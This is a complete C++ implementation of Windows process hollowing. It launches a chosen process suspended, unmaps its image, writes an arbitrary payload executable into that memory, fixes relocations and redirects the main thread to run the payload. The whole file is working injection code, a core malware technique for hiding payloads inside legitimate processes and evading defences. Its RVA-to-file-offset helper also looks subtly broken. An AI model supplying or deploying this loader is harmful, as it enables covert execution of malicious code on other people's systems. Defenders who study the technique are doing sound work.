
#include <iostream>
#include <Windows.h>
#include "windowsinternals.h"
#include <winternl.h>
#include "processutils.h"

// Values taken from WinDbg "dt nt!_PEB" on Windows 10.
#if _WIN64
constexpr auto IMAGE_BASE_OFFSET = 0x10;
#else
constexpr auto IMAGE_BASE_OFFSET = 0x08;
#endif 

_NtQueryInformationProcess	pNtQueryInformationProcess;
_NtUnmapViewOfSection		pNtUnmapViewOfSection;

void	DynamicResolveNtDll();
DWORD	RvaToFileOffset(const char* fileBuffer, DWORD rva);
LPVOID	GetImageBaseOfProcess(HANDLE processHandle);
int		CopyImageIntoProcess(HANDLE processHandle, const char* fileBuffer, const LPVOID newImageBase);
int		ApplyBaseRelocations(HANDLE processHandle, const char* fileBuffer, const LPVOID newImageBase, SIZE_T delta);
int		RedirectThreadToNewEntrypoint(HANDLE threadHandle, const LPVOID& newImageBase, DWORD entrypointRva);

int main(int argc, char** argv)
{
	if (argc < 3)
	{
		printf("Usage: %s <process path> <payload path>\n", argv[0]);
		return 0;
	}
	
	DynamicResolveNtDll();

	// Start up process in a suspended state.
	STARTUPINFOA startupInfo = {};
	PROCESS_INFORMATION processInfo = {};
	if (!CreateProcessA(NULL, argv[1], NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo))
		return PrintLastError("CreateProcessA");

	printf("New process ID: %d.\n", processInfo.dwProcessId);

	do
	{
		// Get process base address through PEB.
		auto imageBase = GetImageBaseOfProcess(processInfo.hProcess);
		if (!imageBase)
			return 1;
		printf("Image base: %p.\n", imageBase);

		// Unmap original process image.
		auto status = pNtUnmapViewOfSection(processInfo.hProcess, imageBase);
		if (!NT_SUCCESS(status))
		{
			PrintLastError("NtUnmapViewOfSection");
			break;
		}

		// Read payload file.
		char* fileBuffer = ReadFileContents(argv[2], NULL);
		auto ntHeaders = ((IMAGE_NT_HEADERS*)(fileBuffer + ((IMAGE_DOS_HEADER*)fileBuffer)->e_lfanew));

		// Allocate SizeOfImage from payload PE.
		auto imageSize = ntHeaders->OptionalHeader.SizeOfImage;
		auto newImageBase = VirtualAllocEx(processInfo.hProcess, imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (newImageBase == NULL)
		{
			PrintLastError("VirtualAllocEx");
			break;
		}

		printf("New image base: %p.\n", newImageBase);
		SIZE_T delta = (SIZE_T)((char*)newImageBase - ntHeaders->OptionalHeader.ImageBase);
		ntHeaders->OptionalHeader.ImageBase = (SIZE_T)newImageBase;

		// Write image in new process.
		if (CopyImageIntoProcess(processInfo.hProcess, fileBuffer, newImageBase) != ERROR_SUCCESS)
			break;

		// Apply relocs.
		if (ApplyBaseRelocations(processInfo.hProcess, fileBuffer, newImageBase, delta) != ERROR_SUCCESS)
			break;

		// Redirect thread to new entrypoint and resume.
		if (RedirectThreadToNewEntrypoint(processInfo.hThread, newImageBase, ntHeaders->OptionalHeader.AddressOfEntryPoint) != ERROR_SUCCESS)
			break;

		if (!ResumeThread(processInfo.hThread))
			PrintLastError("ResumeThread");
	} while (false);

	// Close process and main thread handle.
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
	return 0;
}

void DynamicResolveNtDll()
{
	// Unfortunately, we cannot import / link ntdll in VC++. MSDN suggests dynamic resolution of 
	// functions defined in ntdll. This is what we do here.

	auto ntdll = LoadLibrary(L"ntdll.dll");
	pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
	pNtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
}

LPVOID GetImageBaseOfProcess(HANDLE processHandle)
{
	// We get the image base from the PEB structure of the process. 
	// 
	// The PEB can be obtained by querying PROCESS_BASIC_INFORMATION to get the address within the remote process.
	// We can then use ReadProcessMemory to read the actual contents of the ImageBaseAddress field.

	PROCESS_BASIC_INFORMATION basicInfo = {};
	ULONG returnLength;
	auto status = pNtQueryInformationProcess(processHandle, ProcessBasicInformation, &basicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (!NT_SUCCESS(status))
	{
		PrintLastError("NtQueryInformationProcess");
		return 0;
	}

	LPVOID imageBase;
	LPCVOID imageBaseFieldAddress = (char*)basicInfo.PebBaseAddress + IMAGE_BASE_OFFSET; // Yuck!
	if (!ReadProcessMemory(processHandle, imageBaseFieldAddress, &imageBase, sizeof(LPVOID), NULL))
	{
		PrintLastError("ReadProcessMemory");
		return 0;
	}

	return imageBase;
}

DWORD RvaToFileOffset(const char* fileBuffer, DWORD rva)
{
	auto ntHeaders = ((IMAGE_NT_HEADERS*)(fileBuffer + ((IMAGE_DOS_HEADER*)fileBuffer)->e_lfanew));
	auto sections = (IMAGE_SECTION_HEADER*)((char*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize)
			return sections[i].PointerToRawData;
	}

	return rva;
}

int CopyImageIntoProcess(HANDLE processHandle, const char* fileBuffer, const LPVOID newImageBase)
{
	auto ntHeaders = ((IMAGE_NT_HEADERS*)(fileBuffer + ((IMAGE_DOS_HEADER*)fileBuffer)->e_lfanew));

	// Copy PE headers into process.
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(processHandle, newImageBase, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten))
		return PrintLastError("WriteProcessMemory (Headers)");

	// Copy contents of sections.
	auto sections = (IMAGE_SECTION_HEADER*)((char*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		if (sections[i].PointerToRawData == 0)
			continue;

		auto destinationAddress = (PVOID)((char*)newImageBase + sections[i].VirtualAddress);
		if (!WriteProcessMemory(processHandle, destinationAddress, fileBuffer + sections[i].PointerToRawData, sections[i].SizeOfRawData, &bytesWritten))
			return PrintLastError("WriteProcessMemory (Section)");
	}

	return ERROR_SUCCESS;
}

int ApplyBaseRelocations(HANDLE processHandle, const char* fileBuffer, const LPVOID newImageBase, SIZE_T delta)
{
	// The image base of the PE might be different than the base address that the PE was compiled for (it usually is different).
	// Therefore, some addresses in the code might not line up properly with the actual addresses used at runtime.
	// For this reason, we have the base reloc directory, which is essentially a table of addresses that need to be fixed up.
	// 
	// Normally, the Windows PE loader will automatically fix this by interpreting these base relocations. However, since we are 
	// manually loading the PE image, we don't have the Windows PE loader doing our base relocations anymore, and have to do it
	// ourselves. 

	auto ntHeaders = ((IMAGE_NT_HEADERS*)(fileBuffer + ((IMAGE_DOS_HEADER*)fileBuffer)->e_lfanew));

	// Navigate to reloc dir.
	auto relocDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (relocDirEntry.Size == 0)
		return 0;

	auto ptr = fileBuffer + RvaToFileOffset(fileBuffer, relocDirEntry.VirtualAddress);
	auto end = ptr + relocDirEntry.Size;

	while (ptr < end)
	{
		// Every block in the reloc dir consists of RVA and Size.
		auto pageRva = *(uint32_t*)ptr;
		ptr += sizeof(uint32_t);
		auto size = *(uint32_t*)ptr;
		ptr += sizeof(uint32_t);

		auto count = (size - 2 * sizeof(uint32_t)) / sizeof(uint16_t);
		for (int i = 0; i < count; i++)
		{
			auto value = *(uint16_t*)ptr;
			ptr += sizeof(uint16_t);

			auto type = value >> 12;
			auto rva = pageRva | (value & 0xFFF);

			switch (type)
			{
			case IMAGE_REL_BASED_HIGHLOW:
				DWORD address;
				if (!ReadProcessMemory(processHandle, (char*)newImageBase + rva, &address, sizeof(DWORD), NULL))
					return PrintLastError("ReadProcessMemory (BaseReloc)");
				address += delta;
				if (!WriteProcessMemory(processHandle, (char*)newImageBase + rva, &address, sizeof(DWORD), NULL))
					return PrintLastError("WriteProcessMemory (BaseReloc)");
				break;

			case IMAGE_REL_BASED_DIR64:
				DWORD64 address64;
				if (!ReadProcessMemory(processHandle, (char*)newImageBase + rva, &address64, sizeof(DWORD64), NULL))
					return PrintLastError("ReadProcessMemory (BaseReloc)");
				address64 += delta;
				if (!WriteProcessMemory(processHandle, (char*)newImageBase + rva, &address64, sizeof(DWORD64), NULL))
					return PrintLastError("WriteProcessMemory (BaseReloc)");
				break;
			}
		}
	}

	return ERROR_SUCCESS;
}

int RedirectThreadToNewEntrypoint(HANDLE threadHandle, const LPVOID& newImageBase, DWORD entrypointRva)
{
	// The entrypoint address is set in the EAX register of the main thread upon starting the executable.
	// Therefore, to redirect, simply change this register to the new entrypoint address.

	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;

	if (GetThreadContext(threadHandle, &context) == 0)
		return PrintLastError("GetThreadContext");

#if _WIN64
	context.Rcx = (DWORD64) newImageBase + entrypointRva;
#else
	context.Eax = (DWORD)newImageBase + entrypointRva;
#endif 

	if (!SetThreadContext(threadHandle, &context))
		return PrintLastError("SetThreadContext");
	return ERROR_SUCCESS;
}